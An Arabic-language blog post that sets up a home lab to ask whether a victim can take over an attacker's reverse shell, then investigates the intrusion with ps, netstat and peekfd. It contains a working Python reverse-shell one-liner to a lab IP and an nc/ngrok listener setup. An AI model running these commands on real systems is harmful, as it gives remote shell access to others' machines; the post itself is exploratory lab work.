---
title: اتصال عكس عكسي؟
parent: Contributions
layout: home
---

بسم الله الرحمن الرحيم، قد جاء في بالي تساؤل، هل يمديك تَختَرِق المُختَرِق؟. يعني أنا لو شفت أن في أحد قاعد يتحكم في السيرفر حقي من خلال أنه يخلي السيرفر حقي يشبك على السيرفر حقه (reverse shell) هل يمديني أشبك على السيرفر حقه وأخليه يشبك على السيرفر حقي؟ يعني زي نظام بطتنا نطت فوق بطن بطتكم

# اتصال عكسي بسيط
أنا عندي الجهاز الافتراضي شغال على نظام debian راح يكون هو المهاجم، أما الجهاز حقي راح يكون هو الضحية (حاليًا). الآيبي حق جهازي (192.168.122.1) والآيبي حق المهاجم (192.168.122.120). راح أبدأ بطريقة بسيطة للحصول على اتصال عكسي عبر ngrok:
- ngrok tcp PORT & nc -lnvp PORT في جهاز المهاجم
- في جهازي راح أنفذ سكربت بايثون بسيط (نفترض أن سيرفري فيه ثغرة RCE)

![Attacker_commands](imgs/Screenshot%20From%202025-03-20%2000-39-20.png)
![Victim_commands](imgs/Screenshot%20From%202025-03-20%2000-41-16.png)
![Attacker_reverse_shell](imgs/Screenshot%20From%202025-03-20%2000-41-35.png)

طيب الآن خليني أشوف الهكرجي هذا إيش قاعد يسوي

```shell
ps axjf | grep python

3726    5089    3726    3726 ?             -1 Sl    1000   0:10  |   \_ /usr/bin/python /usr/bin/terminator
   6160   48148   48148    6160 pts/1      48148 S+    1000   0:00  |   |   |   \_ python -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.122.120",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
  41092   50617   50616   41092 pts/2      50616 S+    1000   0:00  |   |   |   \_ grep python
```
نلاحظ أن الآبي حقه ظاهر لنا في هذا الأمر (أنا قاعد ألعب دور مدير النظام، يعني قاعد أحقق في الموضوع) خلينا ناخذ الآيبي هذا ونشوف إيش وضعه. في حال ماحصلت الحمولة اللي رسلها المهاجم للسيرفر حقي أقدر أشوف حركة الشبكة

```bash
sudo netstat -tuenpa 
 
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      962        29003      3083/mongod         
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      952        128807     40174/qemu-system-x 
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      0          20188      1321/dnsmasq        
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          574        902/sshd: /usr/bin/ 
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      0          25808      899/cupsd           
tcp        0      0 127.0.0.1:6463          0.0.0.0:*               LISTEN      1000       123829     39407/app.asar --no 
tcp        0      0 127.0.0.1:4000          0.0.0.0:*               LISTEN      1000       137728     43046/jekyll s      
tcp        0      0 10.19.103.9:44030       142.250.181.78:443      ESTABLISHED 1000       149199     6715/waterfox       
tcp        0      0 10.19.103.9:40252       34.107.243.93:443       ESTABLISHED 1000       137382     6715/waterfox       
tcp        0      0 10.19.103.9:49054       172.66.40.244:443       ESTABLISHED 1000       169110     6715/waterfox       
tcp        0      0 10.19.103.9:58910       162.159.134.234:443     ESTABLISHED 1000       148056     39289/discord --sta 
tcp        0      0 192.168.122.1:42560     192.168.122.120:4242    ESTABLISHED 1000       148709     48148/python     !!!!!!!!!   
tcp6       0      0 :::22                   :::*                    LISTEN      0          576        902/sshd: /usr/bin/ 
tcp6       0      0 ::1:631                 :::*                    LISTEN      0          25807      899/cupsd           
udp        0      0 192.168.122.1:53        0.0.0.0:*                           0          20187      1321/dnsmasq        
udp        0      0 0.0.0.0:67              0.0.0.0:*                           0          20184      1321/dnsmasq        
udp        0      0 10.19.103.9:68          10.13.168.19:67         ESTABLISHED 0          20286      804/NetworkManager 
```
حاولت أفحص المداخل على أمل إني أحصل مدخل مفتوح أقدر أشبك عليه (bind shell) لكن باءت التجربة بالفشل، خليني أشوف إيش قاعد يسوي. الأمر هذا أستخدمه في ال  ctf لأنه ممتع الصراحة، يخليك تشبك على الإتصال اللي أنت تحدده، في هذه الحالة رقم العملية 48148
```bash
peekfd -n -8 -c -d 48148
```
![me](imgs/Screenshot%20From%202025-03-20%2001-37-49.png)
![attacker](imgs/Screenshot%20From%202025-03-20%2001-37-58.png)
طبعا أنا ما أبغى أتفرج على المهاجم بس، أبغى أحاول أتحكم بالإتصال العكسي حقه!